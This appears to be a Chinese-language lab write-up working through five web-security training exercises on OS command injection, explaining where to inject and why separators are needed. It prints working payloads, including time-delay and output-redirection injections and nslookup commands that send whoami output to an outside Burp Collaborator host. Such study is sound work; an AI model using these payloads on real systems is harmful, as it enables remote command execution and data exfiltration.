[TOC]

#### 1. OS command injection, simple case

> The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response.
>
> To solve the lab, execute the `whoami` command to determine the name of the current user.

注入点在`Check stock`那里，要么抓包，要么直接网页代码。

![1.1](OS-command-burp.assets/1.1.png)

#### 2. Blind OS command injection with time delays

> The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response.
>
> To solve the lab, exploit the blind OS command injection vulnerability to cause a 10 second delay.

在feedback界面抓包，将email改成`email=a||sleep+10s||`。

这里应该是email的前面后面都有语句，前面填a并将后面截断那么命令应该就是错的，所以要成功执行，就要前后隔开。

本来是：`part1 +  add-part + part2`

注入`add-part`部分，需要前后都隔开。

比如可以直接`part1 + |sleep 10s; + part2 `，即payload=`|sleep%2010s;`。

只要前后正确隔开，使得中间的延时命令成功执行就好。

#### 3. Blind OS command injection with output redirection

> However, you can use output redirection to capture the output from the command. There is a writable folder at:`/var/www/images/`
>
> The application serves the images for the product catalog from this location. You can redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file.
>
> To solve the lab, execute the `whoami` command and retrieve the output.

注入点和第二题一样：`email=||echo+$(whoami)>/var/www/images/a.txt||`

写入后直接访问发现不行。然后去看一下其他图片是怎么加载的：

`<img src="/image?filename=72.jpg">`

于是去访问`/image?filename=a.txt`，成功得到结果。

#### 4. Blind OS command injection with out-of-band interaction

> you can trigger out-of-band interactions with an external domain.
>
> To solve the lab, exploit the blind OS command injection vulnerability to issue a DNS lookup to Burp Collaborator.

注入点应该还在那里：`email=||nslookup+http://t710b2bnu8s8ow4w6jl6fzcd64cu0j.burpcollaborator.net||`

好家伙，我这个都过了，burp collaborator都没有收到请求。

去看了一下，答案没有加http协议。

#### 5. Blind OS command injection with out-of-band data exfiltration

> To solve the lab, execute the `whoami` command and exfiltrate the output via a DNS query to Burp Collaborator. You will need to enter the name of the current user to complete the lab.

注入点应该还在那里：`email=||nslookup+$(whoami).334a7ufujcj4f91ixr77z9pr6ic80x.burpcollaborator.net||`

直接拿到结果。

